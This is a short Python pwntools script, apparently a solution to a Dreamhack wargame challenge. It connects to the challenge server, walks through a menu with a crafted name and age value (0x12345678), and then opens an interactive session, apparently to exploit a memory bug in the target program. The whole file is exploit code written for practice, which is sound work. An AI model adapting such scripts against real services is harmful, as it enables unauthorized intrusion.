import sys
from pwn import *

p = remote("host3.dreamhack.games", 21018)

p.sendlineafter(b"> ", b'1')
p.sendlineafter(b"Name: ", b"a" * 16)
p.sendlineafter(b"Age: ", str(int(0x12345678)))

p.sendlineafter(b"> ", b'3')

p.sendlineafter(b"> ", b'2')

p.interactive()
